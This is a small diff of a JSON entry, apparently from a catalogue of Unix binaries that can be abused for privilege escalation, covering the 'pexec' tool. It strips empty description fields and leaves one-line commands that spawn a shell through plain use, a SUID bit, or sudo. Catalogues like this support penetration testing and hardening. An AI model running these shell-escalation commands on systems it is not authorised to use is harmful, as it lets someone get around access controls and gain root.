@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "pexec /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./pexec /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo pexec /bin/sh\n"
       }
     ]
